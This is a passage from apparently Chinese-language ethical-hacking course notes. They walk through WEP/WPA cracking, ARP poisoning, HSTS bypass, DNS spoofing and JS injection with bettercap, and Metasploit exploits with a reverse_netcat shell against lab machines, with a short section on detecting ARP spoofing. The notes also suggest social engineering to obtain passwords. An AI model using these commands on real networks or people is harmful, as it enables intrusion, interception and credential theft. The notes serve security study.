&lt;wlan0&gt;<br>選擇目標記錄下他的bssid、channel</p></blockquote><h4 id="對目標實施監聽並取得封包"><a href="#對目標實施監聽並取得封包" class="headerlink" title="對目標實施監聽並取得封包"></a><strong>對目標實施監聽並取得封包</strong></h4><blockquote><p>指令: airodump-ng –bssid 目標MAC –channel 目標頻道 –write 檔案名 wlan0</p></blockquote><h3 id="WEP破解"><a href="#WEP破解" class="headerlink" title="WEP破解"></a><strong>WEP破解</strong></h3><blockquote><p>step 1: 累積封包到一定數目<br>step 2: aircrack-ng 檔案名.cap<br><img src="/photo/Ethical_Hacking/1.jpg" alt="1"><br>密碼:將(1)的冒號刪除輸入或輸入(2)</p></blockquote><h3 id="快速累積封包"><a href="#快速累積封包" class="headerlink" title="快速累積封包"></a><strong>快速累積封包</strong></h3><h4 id="aireplay-ng去認證攻擊"><a href="#aireplay-ng去認證攻擊" class="headerlink" title="aireplay-ng去認證攻擊"></a><strong>aireplay-ng去認證攻擊</strong></h4><blockquote><p>指令: aireplay-ng –deauth 攻擊次數 -a 目標網路MAC -c 目標客戶機MAC wlan0</p></blockquote><h4 id="aireplay-ng假認證攻擊"><a href="#aireplay-ng假認證攻擊" class="headerlink" title="aireplay-ng假認證攻擊"></a><strong>aireplay-ng假認證攻擊</strong></h4><blockquote><p>指令: aireplay-ng –fakeauth 0 -a 目標網路MAC -h 自己網卡的MAC位置(前 6 byte) wlan0</p></blockquote><h4 id="Packet-Injection-ARP-Request-Reply-Attack"><a href="#Packet-Injection-ARP-Request-Reply-Attack" class="headerlink" title="Packet Injection - ARP Request Reply Attack"></a><strong>Packet Injection - ARP Request Reply Attack</strong></h4><blockquote><p>說明 : 迫使連結接入點生成具有新的IV的封包<br>終端A: airodump-ng –bssid 目標MAC –channel 目標頻道 –write 檔案名 wlan0<br>終端B: aireplay-ng –fakeauth 0 -a 目標網路MAC -h 自己網卡的MAC位置(前 6 byte) wlan0<br>終端C: aireplay-ng –arpreplay -b 目標網路MAC -h 自己網卡的MAC位置(前 6 byte) wlan0<br><img src="/photo/Ethical_Hacking/2.jpg" alt="2"></p></blockquote><h4 id="Packet-Injection-Korek-Chopchop-Attack"><a href="#Packet-Injection-Korek-Chopchop-Attack" class="headerlink" title="Packet Injection - Korek Chopchop Attack"></a><strong>Packet Injection - Korek Chopchop Attack</strong></h4><blockquote><p>說明 : 嘗試確定密鑰流<br>終端A: airodump-ng –bssid 目標MAC –channel 目標頻道 –write 檔案名 wlan0<br>終端B: aireplay-ng –fakeauth 0 -a 目標網路MAC -h 自己網卡的MAC位置(前 6 byte) wlan0<br>終端C: aireplay-ng –chopchop -b 目標網路MAC -h 自己網卡的MAC<br>等待終端C跳出是否解密(y)<br><img src="/photo/Ethical_Hacking/3.jpg" alt="3"><br>解密完後，終端C:<br><img src="/photo/Ethical_Hacking/4.jpg" alt="4"></p></blockquote><blockquote><p><strong>note:</strong><br>y後面接的是解密後的檔案名</p></blockquote><blockquote><p>終端C注入:<br><img src="/photo/Ethical_Hacking/5.jpg" alt="5"></p></blockquote><h4 id="Packet-Injection-Fragmentation-Attack"><a href="#Packet-Injection-Fragmentation-Attack" class="headerlink" title="Packet Injection - Fragmentation Attack"></a><strong>Packet Injection - Fragmentation Attack</strong></h4><blockquote><p>說明 : 偽造封包注入</p><blockquote><p>終端A: airodump-ng –bssid 目標MAC –channel 目標頻道 –write 檔案名 wlan0<br>終端B: aireplay-ng –fakeauth 0 -a 目標網路MAC -h 自己網卡的MAC位置(前 6 byte) wlan0<br>終端C: aireplay-ng –fragment -b 目標網路MAC -h 自己網卡的MAC位置(前 6 byte) wlan0<br>終端C:等待詢問是否用此數據包(y)，試圖確定PRG，有可能失敗<br>終端C:取得密鑰流檔案.xor<br>終端C:使用以下兩命令製作及注入封包:<br><img src="/photo/Ethical_Hacking/6.jpg" alt="6"></p></blockquote></blockquote><h3 id="WPA破解-啟用WPS且PBC沒啟用"><a href="#WPA破解-啟用WPS且PBC沒啟用" class="headerlink" title="WPA破解(啟用WPS且PBC沒啟用)"></a><strong>WPA破解(啟用WPS且PBC沒啟用)</strong></h3><h4 id="查看是否啟用WPS"><a href="#查看是否啟用WPS" class="headerlink" title="查看是否啟用WPS"></a><strong>查看是否啟用WPS</strong></h4><blockquote><p>指令 : wash –interface wlan0</p></blockquote><h4 id="破解WPS"><a href="#破解WPS" class="headerlink" title="破解WPS"></a><strong>破解WPS</strong></h4><blockquote><p>執行以下兩個終端機<br><img src="/photo/Ethical_Hacking/7.jpg" alt="7"></p></blockquote><h3 id="WPA破解-禁用WPS或PBC啟用"><a href="#WPA破解-禁用WPS或PBC啟用" class="headerlink" title="WPA破解(禁用WPS或PBC啟用)"></a><strong>WPA破解(禁用WPS或PBC啟用)</strong></h3><h4 id="取得握手包"><a href="#取得握手包" class="headerlink" title="取得握手包"></a><strong>取得握手包</strong></h4><blockquote><p>說明:監聽直到出現以下圖片右上文字<br>終端A指令: airodump-ng –bssid 目標MAC –channel 目標頻道 –write 檔案名 wlan0<br>終端B指令(加速): aireplay-ng –deauth 攻擊次數 -a 目標網路MAC -c 目標客戶機MAC wlan0<br><img src="/photo/Ethical_Hacking/8.jpg" alt="8"></p></blockquote><h4 id="創建字典"><a href="#創建字典" class="headerlink" title="創建字典"></a><strong>創建字典</strong></h4><blockquote><p>說明:使用Crunch創建密碼字典<br><img src="/photo/Ethical_Hacking/9.jpg" alt="9"><br>單字列表參考網址:<br><a href="ftp://ftp.openwall.com/pub/wordlists/">ftp://ftp.openwall.com/pub/wordlists/</a><br><a href="http://www.openwall.com/mirrors/">openwall.com&#x2F;mirrors&#x2F;</a><br><a href="http://gdataonline.com/downloads/GDict/">gdataonline.com&#x2F;downloads&#x2F;GDict&#x2F;</a><br><a href="http://www.outpost9.com/files/WordLists.html">outpost9.com&#x2F;files&#x2F;WordLists.html</a><br><a href="http://www.vulnerabilityassessment.co.uk/passwords.htm">vulnerabilityassessment.co.uk&#x2F;passwords.htm</a><br><a href="http://packetstormsecurity.org/Crackers/wordlists/">packetstormsecurity.org&#x2F;Crackers&#x2F;wordlists&#x2F;</a><br><a href="http://www.ai.uga.edu/ftplib/natural-language/moby/">ai.uga.edu&#x2F;ftplib&#x2F;natural-language&#x2F;moby&#x2F;</a><br><a href="http://www.cotse.com/tools/wordlists1.htm">cotse.com&#x2F;tools&#x2F;wordlists1.htm</a><br><a href="http://www.cotse.com/tools/wordlists2.htm">cotse.com&#x2F;tools&#x2F;wordlists2.htm</a><br><a href="http://wordlist.sourceforge.net/">wordlist.sourceforge.net&#x2F;</a></p></blockquote><h4 id="密碼爆破"><a href="#密碼爆破" class="headerlink" title="密碼爆破"></a><strong>密碼爆破</strong></h4><blockquote><p>指令aircrack-ng 檔案名.cap -w 字典路徑</p></blockquote><blockquote><p><strong>note:</strong><br>目前止WPA2破解唯一方式，建議以社交工程騙取密碼</p></blockquote><h3 id="加速WPA破解"><a href="#加速WPA破解" class="headerlink" title="加速WPA破解"></a><strong>加速WPA破解</strong></h3><h4 id="Cracking-the-Key-Quicker-using-a-Rainbow-Table-以空間換時間"><a href="#Cracking-the-Key-Quicker-using-a-Rainbow-Table-以空間換時間" class="headerlink" title="Cracking the Key Quicker using a Rainbow Table(以空間換時間)"></a><strong>Cracking the Key Quicker using a Rainbow Table(以空間換時間)</strong></h4><blockquote><p>說明 : 先將密碼字典中的密碼加密，以便之後比對<br>創建資料庫 : airolib-ng test-db –import passwd 密碼字典.txt<br>創建破解網路明文件: echo “TOTOLINK_A800R(網路名)” &gt;test-essid<br><img src="/photo/Ethical_Hacking/10.jpg" alt="10"><br>將essid導入 :　airolib-ng test-db –import essid test-essid（文件名）<br>將每個密碼列表與ｅｓｓｉｄ結合計算每個密碼的ＰＭＫ：airolib-ng test-db　–batch　<br>輸入以下指令用資料庫破解:<br><img src="/photo/Ethical_Hacking/11.jpg" alt="11"></p></blockquote><h4 id="Cracking-WPA-WPA2-Much-Faster-Using-GPU-使用GUI破解"><a href="#Cracking-WPA-WPA2-Much-Faster-Using-GPU-使用GUI破解" class="headerlink" title="Cracking WPA&#x2F;WPA2 Much Faster Using GPU(使用GUI破解)"></a><strong>Cracking WPA&#x2F;WPA2 Much Faster Using GPU(使用GUI破解)</strong></h4><blockquote><p>下載驅動GUI(windown)<br><a href="https://hashcat.net/hashcat/">hashcat.net&#x2F;hashcat&#x2F;</a><br><img src="/photo/Ethical_Hacking/12.jpg" alt="12"><br>下載hashcat二進制文件<br><img src="/photo/Ethical_Hacking/13.jpg" alt="13"><br>將cap握手包轉成hashcat支援的格式:<br><a href="https://hashcat.net/cap2hashcat/">hashcat.net&#x2F;cap2hashcat&#x2F;</a><br><img src="/photo/Ethical_Hacking/14.jpg" alt="14"><br>把下圖兩文件丟到hashcat資料夾裡<br><img src="/photo/Ethical_Hacking/15.jpg" alt="15"><br>cmd到hashcat目錄執行<br>執行hashcat64.exe -I 查看可用GPU<br><img src="/photo/Ethical_Hacking/16.jpg" alt="16"><br>執行以下命令:<br><img src="/photo/Ethical_Hacking/17.jpg" alt="17"></p></blockquote><blockquote><p><strong>note:</strong></p><ol><li>-m 數字 : 代表加密類型</li><li>-d 數字 : 使用哪個GUI</li></ol></blockquote><h2 id="連接後攻擊"><a href="#連接後攻擊" class="headerlink" title="連接後攻擊"></a><strong>連接後攻擊</strong></h2><h3 id="Post-Connection-Attacks"><a href="#Post-Connection-Attacks" class="headerlink" title="Post Connection Attacks"></a><strong>Post Connection Attacks</strong></h3><h4 id="Installing-Windows-As-a-Virtual-machine"><a href="#Installing-Windows-As-a-Virtual-machine" class="headerlink" title="Installing Windows As a Virtual machine"></a><strong>Installing Windows As a Virtual machine</strong></h4><blockquote><p>網址:<a href="https://ln5.sync.com/dl/69a8cb2b0/k2xyv9ke-qevy6hgz-tavwxu3c-78858267/view/default/11829848200004">windows模擬機下載</a></p></blockquote><h3 id="Post-Connection-Attacks-資料蒐集"><a href="#Post-Connection-Attacks-資料蒐集" class="headerlink" title="Post Connection Attacks-資料蒐集"></a><strong>Post Connection Attacks-資料蒐集</strong></h3><h4 id="netdiscover"><a href="#netdiscover" class="headerlink" title="netdiscover"></a><strong>netdiscover</strong></h4><blockquote><p>指令 : netdiscover -r 192.168.17.1&#x2F;24</p></blockquote><blockquote><p><strong>note :</strong> </p><ol><li>只能找尋目前所在子網域的主機</li><li>如果用無線網路試配器，要在虛擬機取消網路連線<br><img src="/photo/Ethical_Hacking/18.jpg" alt="18"></li></ol></blockquote><h4 id="GUI-Nmap"><a href="#GUI-Nmap" class="headerlink" title="GUI Nmap"></a><strong>GUI Nmap</strong></h4><blockquote><p>指令 : zenmap</p></blockquote><h3 id="MITM"><a href="#MITM" class="headerlink" title="MITM"></a><strong>MITM</strong></h3><h4 id="ARP-Poisoning-Using-arpspoof"><a href="#ARP-Poisoning-Using-arpspoof" class="headerlink" title="ARP Poisoning Using arpspoof"></a><strong>ARP Poisoning Using arpspoof</strong></h4><blockquote><p>查看window跟kali的網路介面 : arp -a<br>指令 : arpspoof -i eth0 -t  目標機器MAC 受欺騙機器MAC<br><img src="/photo/Ethical_Hacking/19.jpg" alt="19"></p></blockquote><blockquote><p><strong>note:</strong></p><ol><li>終端A:欺騙192.168.17.131(目標)，我是192.168.17.2(路由器)</li><li>終端B:欺騙192.168.17.2(路由器)，我是192.168.17.131(目標)</li><li>終端C:查詢kali的arp表格</li></ol></blockquote><blockquote><p>指令 : echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward</p></blockquote><blockquote><p><strong>note:</strong><br>这条命令的含义是将数字 1 写入 &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward 文件中。</p><p>在 Linux 系统中，&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward 是一个特殊的文件，用于控制 IP 转发功能。IP 转发是指将收到的 IP 数据包从一个网络接口转发到另一个网络接口的功能。</p><p>当将数字 1 写入 &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward 文件时，表示启用了 IP 转发功能。这意味着 Linux 系统将允许接收到的 IP 数据包在不同的网络接口之间进行转发，而不仅仅是将数据包发送到本地系统。</p><p>通常情况下，启用 IP 转发功能是在路由器或者具有网络转发功能的计算机上使用，以便它们可以转发数据包来连接不同的网络。<br>只是暫時，重開機後失效<br>linux一般禁止ip轉接</p></blockquote><h4 id="ARP-Poisoning-Using-bettercap"><a href="#ARP-Poisoning-Using-bettercap" class="headerlink" title="ARP Poisoning Using bettercap"></a><strong>ARP Poisoning Using bettercap</strong></h4><blockquote><p><strong>bettercap基本介紹</strong><br>指令 : bettercap -iface eth0(介面)<br>查看運行模組 : help<br><img src="/photo/Ethical_Hacking/20.jpg" alt="20"><br>查看運行模組詳細 : help net.probe(模組名)<br>開啟網路點探測器 : net.probe on<br><img src="/photo/Ethical_Hacking/21.jpg" alt="21"><br>如上圖 : net.recon網路偵測也會自動開啟<br>查看偵測到的裝置列表 : net.show<br><img src="/photo/Ethical_Hacking/22.jpg" alt="22"></p></blockquote><blockquote><p><strong>bettercap arp欺騙模組</strong><br>查看arp欺騙模組 : help arp.spoof<br><img src="/photo/Ethical_Hacking/23.jpg" alt="23"><br>將arp.spoof.fullduplex設置為true: set arp.spoof.fullduplex true<br>設定目標: set arp.spoof.targets 192.168.17.131(目標ip)<br>開啟模組:arp.spoof on<br><img src="/photo/Ethical_Hacking/24.jpg" alt="24"></p></blockquote><blockquote><p><strong>note :</strong> </p><ol><li>若arp.spoof.fullduplex設置為true : 可欺騙路由器和目標</li><li>若arp.spoof.fullduplex設置為flase : 只欺騙目標</li></ol></blockquote><blockquote><p><strong>分析模組</strong><br>指令: net.sniff on</p><ul><li>舉例:<br>在windows的覽器開啟網頁:<a href="http://vulnweb.com/">http://vulnweb.com/</a><br><img src="/photo/Ethical_Hacking/25.jpg" alt="25"><br><img src="/photo/Ethical_Hacking/26.jpg" alt="26"><br>如上圖: 可攔截未經加密的封包</li></ul></blockquote><h4 id="bettercap快速設定"><a href="#bettercap快速設定" class="headerlink" title="bettercap快速設定"></a><strong>bettercap快速設定</strong></h4><blockquote><p>創建一個文本並寫入要執行的指令且儲存:<br><img src="/photo/Ethical_Hacking/27.jpg" alt="27"><br>啟動: bettercap -iface eth0 -caplet spoof.cap(檔案名)</p></blockquote><h3 id="bettercap-HTTPS解決"><a href="#bettercap-HTTPS解決" class="headerlink" title="bettercap HTTPS解決"></a><strong>bettercap HTTPS解決</strong></h3><h4 id="方法一-對HSTS無效"><a href="#方法一-對HSTS無效" class="headerlink" title="方法一(對HSTS無效)"></a><strong>方法一(對HSTS無效)</strong></h4><blockquote><p>修改文檔使其嗅探所有數據<br><img src="/photo/Ethical_Hacking/28.jpg" alt="28"><br>查看外加腳本:caplets.show<br><img src="/photo/Ethical_Hacking/29.jpg" alt="29"><br>運行 : hstshijack&#x2F;hstshijack<br><img src="/photo/Ethical_Hacking/30.jpg" alt="30"><br>成功使網路降級:<br><img src="/photo/Ethical_Hacking/31.jpg" alt="31"></p></blockquote><h4 id="方法二-繞過HSTS"><a href="#方法二-繞過HSTS" class="headerlink" title="方法二(繞過HSTS)"></a><strong>方法二(繞過HSTS)</strong></h4><blockquote><p>說明:使瀏覽器誤以為在加載別的網頁<br>修改hstshijack，將想替換的網域跟替換成甚麼的網域加上<br><img src="/photo/Ethical_Hacking/32.jpg" alt="32"><br>進入瀏覽器:google.ie<br><img src="/photo/Ethical_Hacking/33.jpg" alt="33"><br>搜尋facebook:<br><img src="/photo/Ethical_Hacking/34.jpg" alt="34"><br>即可完成<br><img src="/photo/Ethical_Hacking/35.jpg" alt="35"></p></blockquote><blockquote><p><strong>統整</strong><br><img src="/photo/Ethical_Hacking/36.jpg" alt="36"></p></blockquote><h3 id="DNS-Spoofing-Controlling-DNS-Requests-on-The-Network"><a href="#DNS-Spoofing-Controlling-DNS-Requests-on-The-Network" class="headerlink" title="DNS Spoofing - Controlling DNS Requests on The Network"></a><strong>DNS Spoofing - Controlling DNS Requests on The Network</strong></h3><h4 id="啟動kali中的伺服器"><a href="#啟動kali中的伺服器" class="headerlink" title="啟動kali中的伺服器"></a><strong>啟動kali中的伺服器</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2(伺服器名稱) start</span><br></pre></td></tr></table></figure><p><img src="/photo/Ethical_Hacking/37.jpg" alt="37"></p><blockquote><p>網頁默認存在: var&#x2F;www&#x2F;html</p></blockquote><h4 id="DNS欺騙-對HSTS無效"><a href="#DNS欺騙-對HSTS無效" class="headerlink" title="DNS欺騙(對HSTS無效)"></a><strong>DNS欺騙(對HSTS無效)</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bettercap -iface eth0 -caplet spoof.cap</span><br><span class="line">help dns.spoof</span><br></pre></td></tr></table></figure><p><img src="/photo/Ethical_Hacking/38.jpg" alt="38"></p><blockquote><p><strong>note:</strong></p><ol><li>dns.spoof.address:DNS欺騙地址(預設定向到自己)</li><li>dns.spoof.all:欺騙全部</li><li>dns.spoof.domains:欺騙的網域</li></ol></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set dns.spoof.all true</span><br><span class="line">set dns.spoof.domains zsecurity.org,*.zsecurity.org(網域)</span><br></pre></td></tr></table></figure><p><img src="/photo/Ethical_Hacking/39.jpg" alt="39"></p><h4 id="注入js"><a href="#注入js" class="headerlink" title="注入js"></a><strong>注入js</strong></h4><blockquote><p>寫js文檔<br>更改hstshijack.cap在set hstshijack.payloadsr加上你的js文檔<br><img src="/photo/Ethical_Hacking/40.jpg" alt="40"></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bettercap -iface eth0 -caplet spoof.cap</span><br><span class="line">hstshijack/hstshijack</span><br></pre></td></tr></table></figure><p><img src="/photo/Ethical_Hacking/41.jpg" alt="41"></p><blockquote><p>注入成功<br><img src="/photo/Ethical_Hacking/42.jpg" alt="42"></p></blockquote><h3 id="bettercap圖形介面"><a href="#bettercap圖形介面" class="headerlink" title="bettercap圖形介面"></a><strong>bettercap圖形介面</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bettercap -iface eth0</span><br><span class="line">http-ui</span><br></pre></td></tr></table></figure><blockquote><p>預設帳號:user<br>預設密碼:pass<br><img src="/photo/Ethical_Hacking/43.jpg" alt="43"></p></blockquote><h3 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a><strong>wireshark</strong></h3><blockquote><p>說明:wireshark只能捕捉自己電腦的流量，但當我們成為中間人時，可用來分析中間人接口的流量及封包</p></blockquote><h4 id="錄製封包"><a href="#錄製封包" class="headerlink" title="錄製封包"></a><strong>錄製封包</strong></h4><blockquote><p>開啟bettercap，並使自己成為中間人<br>打開wireshark<br>選擇網路介面，開始錄製<br><img src="/photo/Ethical_Hacking/44.jpg" alt="44"></p></blockquote><h4 id="過濾封包"><a href="#過濾封包" class="headerlink" title="過濾封包"></a><strong>過濾封包</strong></h4><blockquote><p>因為有對目標發動降級攻擊，因此可以在過濾框中輸入http，來過濾封包<br><img src="/photo/Ethical_Hacking/45.jpg" alt="45"><br>上圖:追蹤封包回應的完整訊息<br><img src="/photo/Ethical_Hacking/46.jpg" alt="46"><br>回應了一個網頁html<br>找尋使用者帳號密碼<br><img src="/photo/Ethical_Hacking/47.jpg" alt="47"></p></blockquote><blockquote><p>修改spoof文檔使得在bettercap開啟時，錄製封包，不必開啟wireshark<br><img src="/photo/Ethical_Hacking/48.jpg" alt="48"></p></blockquote><blockquote><p>ctrl+F可在wireshark裡查找捕獲數據包的任何內容<br><img src="/photo/Ethical_Hacking/49.jpg" alt="49"></p></blockquote><h3 id="Creating-a-Fake-Access-Point-Honeypot-Practical"><a href="#Creating-a-Fake-Access-Point-Honeypot-Practical" class="headerlink" title="Creating a Fake Access Point (Honeypot) - Practical"></a><em>Creating a Fake Access Point (Honeypot) - Practical</em></h3><h4 id="確認配置"><a href="#確認配置" class="headerlink" title="確認配置"></a>確認配置</h4><blockquote><ol><li>無限網卡不能為監聽模式</li><li>無線網卡不能連接任何網路</li><li>kali機器有連接網路(eth0)</li></ol></blockquote><h4 id="wifi-hotspot"><a href="#wifi-hotspot" class="headerlink" title="wifi hotspot"></a>wifi hotspot</h4><blockquote><p>啟動wifi hotspot<br>設定wifi<br><img src="/photo/Ethical_Hacking/50.jpg" alt="50"></p></blockquote><h3 id="檢測自己機器是否arp中毒"><a href="#檢測自己機器是否arp中毒" class="headerlink" title="檢測自己機器是否arp中毒"></a><em>檢測自己機器是否arp中毒</em></h3><h4 id="xarp"><a href="#xarp" class="headerlink" title="xarp"></a><strong>xarp</strong></h4><p>下載連結:<a href="https://softfamous.com/xarp/">xarp</a></p><blockquote><p>啟動:xarp<br><img src="/photo/Ethical_Hacking/51.jpg" alt="51"><br>發動arp攻擊時:<br><img src="/photo/Ethical_Hacking/52.jpg" alt="52"><br>因為一個網域裡的每台機器mac位置都不會重複，因此當發動arp攻擊時，會被偵測到</p></blockquote><h4 id="wireshark-1"><a href="#wireshark-1" class="headerlink" title="wireshark"></a><strong>wireshark</strong></h4><blockquote><p>開啟arp檢測<br><img src="/photo/Ethical_Hacking/53.jpg" alt="53"><br><img src="/photo/Ethical_Hacking/54.jpg" alt="54"></p></blockquote><blockquote><p>當有人試圖偵測網路上所有機器時<br><img src="/photo/Ethical_Hacking/55.jpg" alt="55"></p></blockquote><blockquote><p>當arp中毒時<br><img src="/photo/Ethical_Hacking/56.jpg" alt="56"><br>警告我們路由器有2個mac位置</p></blockquote><blockquote><p>預防方法:</p><ol><li>有交換器能幫忙監測arp欺騙</li><li>將arp表的每個ip設為靜態的(缺點:每次變動都必須手動更改)</li></ol></blockquote><blockquote><p>中間人攻擊預防方法:<br>無法管理網路時(大學網路，機場網路或酒店網路等):<br>加密自己的流量(vpn)<br><img src="/photo/Ethical_Hacking/57.jpg" alt="57"></p></blockquote><blockquote><p>統整:<br><img src="/photo/Ethical_Hacking/58.jpg" alt="58"></p></blockquote><h3 id="服務器入侵"><a href="#服務器入侵" class="headerlink" title="服務器入侵"></a><strong>服務器入侵</strong></h3><h4 id="安裝Metasploitable"><a href="#安裝Metasploitable" class="headerlink" title="安裝Metasploitable"></a>安裝Metasploitable</h4><blockquote><p>下載網址:<a href="https://sourceforge.net/projects/metasploitable/">metasploitable</a><br>預設帳號: msfadmin<br>預設密碼: msfadmin</p></blockquote><h4 id="搜集訊息"><a href="#搜集訊息" class="headerlink" title="搜集訊息"></a><strong>搜集訊息</strong></h4><blockquote><p>找尋目標ip: ping URL<br><img src="/photo/Ethical_Hacking/59.jpg" alt="59"><br>利用nmap或zenamp進行掃描<br><img src="/photo/Ethical_Hacking/60.jpg" alt="60"><br>ftp錯誤配置，允許匿名登陸:<br><img src="/photo/Ethical_Hacking/61.jpg" alt="61"><br>去google找尋這ftp是版本是否有漏洞</p></blockquote><p>舉例(錯誤配置):</p><blockquote><p><img src="/photo/Ethical_Hacking/62.jpg" alt="62"><br>去google找尋這程序在做甚麼<br><img src="/photo/Ethical_Hacking/63.jpg" alt="63"><br>由上圖可知 這是一個遠端的登錄程序<br>嘗試查詢如何使用並連接<br><img src="/photo/Ethical_Hacking/64.jpg" alt="64"><br>搜尋資訊<br><img src="/photo/Ethical_Hacking/65.jpg" alt="65"></p></blockquote><blockquote><p>metasploit框架<br>metasploit指令<br><img src="/photo/Ethical_Hacking/66.jpg" alt="66"><br>msfconsole:啟動程序<br>show:顯示一些訊息(可用的漏洞或補助設備，有效負載等)<br>use:使用漏洞運行<br>set:設置利用漏洞的特殊選項</p></blockquote><blockquote><p><img src="/photo/Ethical_Hacking/61.jpg" alt="61"><br>google搜尋vsftpd 2.3.4 exploit<br><img src="/photo/Ethical_Hacking/67.jpg" alt="67"><br>發現一個后門可用metasploit攻擊<br>使用模塊名稱:<br><img src="/photo/Ethical_Hacking/68.jpg" alt="68"></p></blockquote><p>舉例(后門):</p><blockquote><p>用metasploit攻擊<br>終端機輸入</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/unix/ftp/vsftpd_234_backdoor #使用模組</span><br></pre></td></tr></table></figure><p><img src="/photo/Ethical_Hacking/69.jpg" alt="69"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show options #針對利用漏洞攻擊的選項</span><br><span class="line">set RHOSTS 192.168.17.133 #設定目標ip</span><br></pre></td></tr></table></figure><p><img src="/photo/Ethical_Hacking/70.jpg" alt="70"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit #有時沒發生甚麼，再執行一次</span><br></pre></td></tr></table></figure><blockquote><p>運行成功<br><img src="/photo/Ethical_Hacking/71.jpg" alt="71"></p></blockquote><p><strong>舉例(端口139的Samba smbd 3.X，緩衝益位):</strong></p><blockquote><p>去google發現<br><img src="/photo/Ethical_Hacking/72.jpg" alt="72"><br>這是一個命令執行的漏洞</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/samba/usermap_script #使用模組</span><br><span class="line">show options</span><br></pre></td></tr></table></figure><p><img src="/photo/Ethical_Hacking/73.jpg" alt="73"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set RHOSTS 192.168.17.133 #設定目標ip</span><br></pre></td></tr></table></figure><blockquote><p>選擇運行的有效負載</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show payloads</span><br></pre></td></tr></table></figure><p><img src="/photo/Ethical_Hacking/74.jpg" alt="74"></p><blockquote><p>有兩種主要類型<br>bind payloads:在目標計算機上打開一個端口，然後我們連接到該端口<br>reverse payloads:在我們計算機打開一個端口，讓他連接過來(比較容易繞過防火牆)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set PAYLOAD payload/cmd/unix/reverse_netcat</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br><span class="line">set LHOST 192.168.17.132</span><br><span class="line">set LPORT 5555(不一定要設定，隨便端口都可)</span><br><span class="line">show options</span><br></pre></td></tr></table></figure><blockquote><p>設定完成<br><img src="/photo/Ethical_Hacking/75.jpg" alt="75"></p></blockquote><blockquote><p>啟動</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit </span><br></pre></td></tr></table></figure><blockquote><p>連接成功<br><img src="/photo/Ethical_Hacking/76.jpg" alt="76"></p></blockquote><h4 id="nexpose"><a href="#nexpose" class="headerlink" title="nexpose"></a><strong>nexpose</strong></h4><blockquote><p>下載連結: <a href="https://www.rapid7.com/products/nexpose/request-download/">nexpose</a><br>臨時電子郵件:<a href="https://temp-mail.org/">temp-mail.org</a></p></blockquote><blockquote><p>下載完後:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x Rapid7Setup-Linux64.bin</span><br><span class="line">./Rapid7Setup-Linux64.bin</span><br></pre></td></tr></table></figure><blockquote><p>安裝完後關閉nexpose自動啟動程序</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl disable nexposeconsole.service</span><br></pre></td></tr></table></figure><blockquote><p>啟動nexpose</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/rapid7/nexpose/</span><br><span class="line">cd nsc</span><br><span class="line">./nsc.sh #啟動時要非常久，約30分鐘</span><br></pre></td></tr></table></figure><blockquote><p>完成後有一個網址可訪問<br><img src="/photo/Ethical_Hacking/77.jpg" alt="77"><br>登陸之前設定的帳號密碼<br><img src="/photo/Ethical_Hacking/78.jpg" alt="78"><br>登陸後，輸入之前信件裡的密鑰</p></blockquote><blockquote><p>添加目標<br><img src="/photo/Ethical_Hacking/79.jpg" alt="79"><br><img src="/photo/Ethical_Hacking/80.jpg" alt="80"><br><img src="/photo/Ethical_Hacking/81.jpg" alt="81"><br>選擇掃描位置<br><img src="/photo/Ethical_Hacking/82.jpg" alt="82"><br>可選擇設定日志，自動掃描<br><img src="/photo/Ethical_Hacking/83.jpg" alt="83"><br>啟動掃描<br><img src="/photo/Ethical_Hacking/84.jpg" alt="84"></p></blockquote><blockquote><p>掃描完成<br><img src="/photo/Ethical_Hacking/85.jpg" alt="85"><br>發現714個漏洞，可利用攻擊223<br><img src="/photo/Ethical_Hacking/86.jpg" 